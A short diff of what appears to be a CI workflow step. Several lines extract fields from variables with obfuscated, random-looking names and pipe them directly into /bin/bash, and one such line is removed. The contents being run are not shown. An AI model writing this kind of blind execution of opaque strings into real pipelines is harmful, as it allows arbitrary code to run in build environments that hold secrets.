@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
           printf '%s' "$ohmjy90" | jq -r .dg869 | /bin/bash
-          echo $qijwj6612 | jq -r .py901 | /bin/bash
           echo $s92440 | jq -r .zgl543 | /bin/bash
           echo $ea839 | jq -r .aut90 | /bin/bash
 
